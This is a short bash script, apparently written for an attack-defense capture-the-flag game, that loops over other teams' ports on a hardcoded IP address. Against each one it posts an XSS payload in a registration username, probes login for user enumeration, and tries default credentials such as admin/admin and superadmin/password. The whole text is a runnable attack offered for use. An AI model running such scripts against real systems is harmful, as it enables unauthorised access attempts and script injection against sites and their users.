#!/bin/bash

echo "🔥 Advanced attack techniques for other teams..."

TEAMS=("9001" "9003" "9004" "9005")
BASE_URL="http://54.69.37.82"

for port in "${TEAMS[@]}"; do
    target_url="$BASE_URL:$port"
    echo "Targeting $target_url"
    
    # XSS attempt in flash messages
    echo "[*] Attempting XSS via error messages..."
    curl -s "$target_url/register" \
        -d "username=<script>alert('XSS')</script>" \
        -d "password=test" \
        -d "confirm_password=different" \
        -d "role=normal" \
        -o /dev/null
    
    # Try to enumerate users via timing attacks
    echo "[*] Attempting user enumeration..."
    curl -s "$target_url/login" \
        -d "username=admin" \
        -d "password=wrongpassword" \
        -o /dev/null
    
    # Try default credentials
    echo "[*] Trying default credentials..."
    curl -s "$target_url/login" \
        -d "username=admin" \
        -d "password=admin" \
        -o /dev/null
        
    curl -s "$target_url/login" \
        -d "username=superadmin" \
        -d "password=password" \
        -o /dev/null
done

echo "Advanced attacks completed!"
